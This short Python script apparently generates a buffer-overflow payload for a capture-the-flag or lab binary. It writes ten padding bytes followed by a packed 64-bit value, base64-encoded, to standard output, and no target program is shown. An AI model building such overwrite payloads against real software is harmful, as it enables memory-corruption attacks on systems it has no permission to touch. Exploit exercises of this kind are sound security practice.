
import sys
import struct
import base64

buf = b'RRRRRRRRRR'
buf += struct.pack('<Q', 2587400216906460390)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
